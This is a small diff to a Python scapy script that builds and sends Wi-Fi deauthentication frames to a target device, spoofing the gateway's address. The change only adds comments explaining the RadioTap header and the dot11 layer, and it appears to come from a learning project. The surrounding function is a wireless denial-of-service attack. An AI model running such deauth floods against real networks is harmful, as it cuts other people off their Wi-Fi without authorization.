@@ -14,7 +14,10 @@ def deauth(target_mac, gateway_mac, iface, count=100):
     )
 
     # Deauthentication frame
-    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    packet = RadioTap() / dot11 / Dot11Deauth(reason=7) 
+    #RadioTap -> metadata header used in wifi
+    #dot11 -> wifi mac
+
 
     print(f"[*] Sending {count} deauth frames to {target_mac} from AP {gateway_mac}...")
 
